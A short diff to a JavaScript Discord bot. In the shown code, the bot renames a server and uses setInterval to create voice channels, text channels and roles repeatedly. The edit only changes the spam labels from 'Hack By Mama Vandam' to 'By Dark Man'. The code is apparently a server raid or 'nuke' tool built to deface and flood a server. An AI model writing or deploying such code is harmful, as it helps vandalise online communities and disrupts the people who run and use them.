@@ -17,9 +17,9 @@ client.on("message", message => {
       });
       message.guild.setName("Tanha Agadarman Krdyawa");
       setInterval(function() {
-        message.guild.createChannel(" Hack By Mama Vandam 🦍", "voice");
-        message.guild.createChannel(" Hack By Mama Vandam 🦍", "text");
-        message.guild.createRole({ name: " لەرەی گوورگ" });
+        message.guild.createChannel(" By Dark Man", "voice");
+        message.guild.createChannel(" By Dark Man", "text");
+        message.guild.createRole({ name: "By Dark Man" });
       });
     }
   }
